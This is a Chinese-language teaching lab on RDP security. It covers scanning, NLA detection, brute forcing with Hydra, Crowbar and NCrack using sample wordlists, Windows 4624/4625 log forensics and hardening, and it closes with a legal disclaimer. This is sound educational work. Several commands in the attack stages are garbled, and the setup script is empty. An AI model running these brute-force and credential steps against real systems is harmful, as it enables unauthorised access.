# 实验五：RDP远程桌面安全渗透

> 对应章节：项目五 Windows服务器远程管理
实验目标：掌握 RDP 发现与信息枚举、NLA（网络级身份验证）影响、暴力破解与日志取证、以及 NLA/锁定策略/IP 限制等加固验证
预计用时：90分钟
难度等级：⭐⭐⭐（中级）
> 

---

# 第一部分：前置知识点

## 1. RDP协议深度解析

### 1.1 RDP工作原理

远程桌面协议（Remote Desktop Protocol，RDP）是微软开发的远程图形化访问协议，基于TCP 3389端口，允许用户通过网络看到和操作远程计算机的桌面。

```
RDP连接建立过程：

客户端                    网络                    服务器
┌─────────┐                                        ┌─────────┐
│         │  1. CredSSP/Kerberos/NTLM 认证      │         │
│ 远程    │ ─────────────────────────────────────► │  RDP    │
│ 桌面    │                                        │  会话   │
│ 连接    │  2. 建立RDP会话                       │  主机    │
│ 客户端  │ ◄───────────────────────────────────── │         │
│         │                                        │  桌面    │
│         │  3. 传输桌面图像（位图/编解码）        │  合成器  │
│         │ ◄───────────────────────────────────── │         │
│         │                                        │         │
│         │  4. 传输键盘/鼠标输入                  │         │
│         │ ─────────────────────────────────────► │         │
└─────────┘                                        └─────────┘

传输内容（默认RC4加密，可升级为TLS）：
• 桌面位图数据（屏幕画面）
• 键盘和鼠标事件
• 剪贴板数据
• 音频重定向
• 驱动器/打印机重定向
```

### 1.2 RDP安全层次分析

```
RDP连接涉及的多层安全机制：

┌──────────────────────────────────────────────────────────┐
│ Layer 1: 网络层                                          │
│ ├─ 端口可达性：3389端口是否对外开放                       │
│ ├─ 防火墙规则：是否限制来源IP                           │
│ └─ VPN/跳板机：是否通过加密隧道访问                     │
├──────────────────────────────────────────────────────────┤
│ Layer 2: 认证层（本实验重点）                            │
│ ├─ NLA（网络级身份验证）：连接前先认证                   │
│ ├─ 账户锁定策略：防止暴力破解                           │
│ ├─ 密码复杂度：防止弱口令                               │
│ └─ 多因素认证（MFA）：增强认证强度                        │
├──────────────────────────────────────────────────────────┤
│ Layer 3: 会话层                                          │
│ ├─ 会话超时：空闲会话自动断开                             │
│ ├─ 会话锁定：断开后自动锁定屏幕                           │
│ ├─ 设备重定向限制：防止数据外泄                           │
│ └─ 会话录制：审计远程操作行为                             │
├──────────────────────────────────────────────────────────┤
│ Layer 4: 加密层                                          │
│ ├─ TLS加密：保护传输数据不被窃听                          │
│ ├─ 证书验证：防止中间人攻击                               │
│ └─ RDP Shortpath：减少连接延迟（受保护环境下）           │
└──────────────────────────────────────────────────────────┘
```

### 1.3 NLA（网络级身份验证）详解

```
无NLA的连接流程（不安全）：
客户端 ──TCP连接──► 服务器（建立完整RDP会话）──► 显示登录界面
                                                      ↑ 暴力破解可以到达这里

有NLA的连接流程（安全）：
客户端 ──TCP连接──► 服务器
         │
         ▼
   CredSSP认证（在建立RDP会话前完成认证）
         │
         ├── 认证失败 → 直接断开连接（不创建会话）
         │
         └── 认证成功 → 才建立RDP会话 → 显示桌面

NLA的核心价值：
✓ 认证失败不消耗服务器会话资源
✓ 减少暴力破解的攻击面（无法到达登录界面）
✓ 支持多种认证协议（Kerberos/NTLM/CredSSP）
✓ Windows 10/Server 2019+ 默认启用

⚠️ NLA不能替代强密码！
   NLA只是将认证提前到网络层，
   弱密码仍然可以被暴力破解。
   正确做法：NLA + 强密码 + 账户锁定策略 + IP限制
```

### 1.4 RDP日志中的安全事件

```
Windows安全日志中RDP相关的关键事件ID：

4624 (Logon Type 7/10)
  ├── Logon Type 7 = Unlock（解锁已断开的会话）
  ├── Logon Type 10 = RemoteInteractive（RDP新登录）
  └── 关注字段：Source Network Address（来源IP）

4625 (登录失败)
  ├── 同一IP大量出现 → 暴力破解攻击
  └── 关注字段：Failure Reason, Sub Status

4778 (会话重连成功)
  └── 表示断开后重新连接

4779 (会话断开)
  └── 会话正常结束

⚠️ 审计要点：
- 短时间内同一IP的4625事件 ≥ 5次 → 可能是暴力破解
- 非工作时间的4624 Type 10事件 → 可能是未授权访问
- 4625 Sub Status 0xC000006A → 账户被禁用
- 4625 Sub Status 0xC0000234 → 账户被锁定
```

> **实验关键提示**：本实验围绕 RDP 安全展开，从服务探测到 NLA 检测，再到暴力破解与日志取证，最后完成全面加固（NLA + 锁定策略 + IP 限制 + 会话超时）。理解“为什么加固有效”是核心目标。
> 

---

# 第二部分：实验操作

## 一、实验环境配置

### 1.1 网络拓扑

```
┌─────────────────────┐              NAT模式               ┌─────────────────────┐
│    Kali Linux       │           192.168.1.0/24             │  Windows Server     │
│   2025.4（攻击机）  │◄──────────────────────────────────►  │    2025（靶机）      │
│  IP: 192.168.1.10   │                                      │  IP: 192.168.1.20   │
└─────────────────────┘                                      └─────────────────────┘
```

### 1.2 靶机环境详细配置

**虚拟机设置**：

| 项目 | 配置 | 操作系统 | Windows Server 2025 Standard（桌面体验版） |
| --- | --- | --- | --- |
| 内存 | 4 GB | 硬盘 | 60 GB |
| 网络适配器 | NAT模式 | 快照 | 实验前创建快照（命名：实验五-初始状态） |

**靶机初始化脚本**（管理员PowerShell执行）：

# ============================================

---

## 二、实验步骤

### 阶段一：RDP服务探测

**步骤1：发现RDP服务**

```
# 使用Nmap扫描RDP端口
nmap -p 3389 192.168.1.20

# 服务版本探测
nmap -sV -p 3389 192.168.1.20

# 使用Nmap脚本获取RDP详细信息
nmap -p 3389 --script rdp-enum-encryption 192.168.1.20
nmap -p 3389 --script rdp-ntlm-info 192.168.1.20

# 预期输出（示例）：
# 3389/tcp open  ms-wbt-server
# rdp-ntlm-info:
#   Target_Name: TARGET-SERVER
#   NetBIOS_Domain_Name: WORKGROUP
#   Product_Version: 10.0.26100
```

> **知识关联**：对应讲义中”认识远程桌面”——RDP默认监听3389端口，容易被扫描器发现。
> 

**步骤2：全端口扫描发现非标准RDP端口**

```
# 全端口扫描（发现是否有非标准RDP端口）
nmap -p- 192.168.1.20

# 使用Nmap脚本自动识别RDP服务（不限3389端口）
nmap -p- --script rdp-ntlm-info 192.168.1.20
```

---

### 阶段二：NLA状态检测

**步骤3：检测NLA是否启用**

使用CrackMapExec检测NLA状态

crackmapexec rdp 192.168.1.20

> **知识关联**：对应讲义中”网络级身份验证（NLA）“——NLA要求在建立完整RDP会话前先完成身份验证，关闭NLA则允许攻击者进行更多攻击。
> 

> **安全分析**：NLA关闭意味着：
> 
> 1. 攻击者可以触发认证暴力破解
> 2. 可能存在远程代码执行漏洞（如BlueKeep CVE-2019-0708）
> 3. 会话更容易被劫持

---

### 阶段三：RDP暴力破解

**步骤4：使用Hydra进行RDP暴力破解**

```
# 准备字典（示例）
cat > /tmp/rdp_users.txt << 'EOF'
rdpuser1
rdpuser2
rdpuser3
rdpadmin
EOF

cat > /tmp/rdp_passwords.txt << 'EOF'
123456
P@ssw0rd123
admin@123
EOF

# 使用Hydra进行RDP暴力破解
hydra -L /tmp/rdp_users.txt -P /tmp/rdp_passwords.txt rdp://192.168.1.20 -t 4 -vV
```

**步骤5：使用Crowbar进行RDP爆破**

# Crowbar支持RDP爆破-b rdp -s 192.168.1.20/32 -U /tmp/rdp_users.txt -C /tmp/rdp_passwords.txt -n 1

**步骤6：使用NCrack进行RDP爆破**

ncrack -vv –user rdpuser1 –pass 123456 rdp://192.168.1.20-vv -U /tmp/rdp_users.txt -P /tmp/rdp_passwords.txt rdp://192.168.1.20

> **知识关联**：对应讲义中”弱口令风险”——没有账户锁定策略时，暴力破解可以无限制尝试。
> 

---

### 阶段四：RDP会话安全分析

**步骤7：查看活动RDP会话**

从Kali攻击机通过已获取的凭据查询靶机的活动会话：

# 使用CrackMapExec查询rdp 192.168.1.20 -u rdpadmin -p ‘admin@123’ –sessions# 使用Evil-WinRM执行远程命令-winrm -i 192.168.1.20 -u rdpadmin -p ‘admin@123’# 在远程Shell中执行：# 查看当前登录的会话user # 查询已登录用户

**步骤8：分析RDP日志（从靶机侧）**

在靶机上查看安全日志中的RDP登录事件：

```powershell
# 查看4624（登录成功）事件中的RDP登录
Get-WinEvent -LogName Security | Where-Object {
    $_.Id -eq 4624 -and $_.Message -match "Logon Type 10"
} | Select-Object TimeCreated, Message -First 10 | Format-List

# Logon Type 10 = RemoteInteractive（RDP登录）
# Logon Type 3 = Network（网络登录）
# Logon Type 7 = Unlock（解锁屏幕）
# Logon Type 2 = Interactive（本地登录）

# 查看4625（登录失败）事件
Get-WinEvent -LogName Security | Where-Object {
    $_.Id -eq 4625
} | Select-Object TimeCreated -First 20

# 统计暴力破解尝试次数
(Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4625}).Count
```

> **知识关联**：对应讲义中”Windows安全日志”——事件ID 4624/4625 记录了RDP登录的成功与失败，是检测暴力破解的关键数据源。
> 

---

### 阶段五：RDP安全加固与验证

**步骤9：启用NLA（网络级身份验证）**

```powershell
# 方法一：注册表
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" `
    -Name "UserAuthentication" -Value 1

# 方法二：PowerShell
# 通过WMI设置
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" `
    -Name "fDenyTSConnections" -Value 0
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" `
    -Name "UserAuthentication" -Value 1

# 验证NLA已启用
Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication"
# UserAuthentication = 1 → NLA已开启
```

**步骤10：配置账户锁定策略**

```powershell
# 通过secpol.msc配置：
# secpol.msc → 安全设置 → 账户策略 → 账户锁定策略
#   账户锁定阈值 → 5 次
#   账户锁定时间 → 15 分钟
#   复位账户锁定计数器的时间间隔 → 15 分钟

# 或通过命令行
net accounts /lockoutthreshold:5 /lockoutduration:15 /lockoutwindow:15

# 强制刷新策略
gpupdate /force

# 验证
net accounts
```

**步骤11：限制RDP访问来源IP**

```powershell
# 方法一：通过防火墙规则限制（仅允许指定IP访问）
# 可选：先禁用默认RDP规则（避免与新规则叠加导致误判）
Disable-NetFirewallRule -DisplayGroup "Remote Desktop"

# 创建新的限制性规则（仅允许 192.168.1.10）
New-NetFirewallRule -DisplayName "RDP Allow Limited" -Direction Inbound -Protocol TCP -LocalPort 3389 -Action Allow -RemoteAddress 192.168.1.10

# 验证规则作用域
Get-NetFirewallRule -DisplayName "RDP Allow Limited" | Get-NetFirewallAddressFilter
```

**步骤12：设置会话超时**

```powershell
# 通过gpedit.msc配置：
# gpedit.msc → 计算机配置 → 管理模板 → Windows 组件 → 远程桌面服务 → 远程桌面会话主机 → 会话时间限制
#   为活动但空闲的远程桌面服务会话设置时间限制 → 已启用 → 30 分钟
#   活动但空闲的远程桌面服务会话时间限制（已断开） → 已启用 → 15 分钟

# 通过注册表
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v MaxIdleTime /t REG_DWORD /d 1800000 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v MaxDisconnectionTime /t REG_DWORD /d 900000 /f
```

**步骤13：验证加固效果**

```
# 1. 验证NLA已开启
crackmapexec rdp 192.168.1.20
# 预期：NLA: True

# 2. 验证暴力破解被限制（5次后锁定）
hydra -l rdpuser1 -P /tmp/rdp_passwords.txt rdp://192.168.1.20 -t 1 -w 3 -vV
# 预期：尝试5次后账户被锁定（事件4625出现0xC0000234）

# 3. 从非授权IP验证连接被拒绝（需从另一台/改IP测试）

# 4. 重新检查端口状态
nmap -p 3389 -sV 192.168.1.20
```

---

## 三、实验报告要求

| 序号 | 记录项 | 说明 |
| --- | --- | --- |
| 1 | RDP服务探测结果 | 端口状态、NLA状态、加密级别 |
| 2 | 暴力破解结果 | 成功破解的账户和密码 |
| 3 | 日志分析 | 安全日志中的4624/4625事件分析 |
| 4 | 加固配置清单 | NLA、锁定策略、IP限制、超时设置 |
| 5 | 加固前后对比 | Hydra爆破效果对比 |

### 思考题

1. NLA关闭时，攻击者有哪些额外攻击面？为什么NLA是重要的安全措施？
2. 修改RDP默认端口能否替代防火墙IP限制？为什么？
3. 账户锁定策略的三个参数（阈值、锁定时间、复位时间）应如何配合设置？
4. 在生产环境中，为什么推荐使用VPN而不是直接暴露RDP端口？
5. 分析安全日志时，如何区分正常的多次登录失败和暴力破解攻击？

---

## 四、实验清理

```powershell
# 1. 关闭远程桌面
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 1

# 2. 删除测试账户
net user rdpuser1 /delete
net user rdpuser2 /delete
net user rdpuser3 /delete
net user rdpuser4 /delete
net user rdpadmin /delete

# 3. 启用防火墙
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True

# 4. 恢复默认RDP防火墙规则
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

> **免责声明**：本实验仅用于授权的安全教学环境。对任何未授权系统进行RDP暴力破解属于违法行为。
>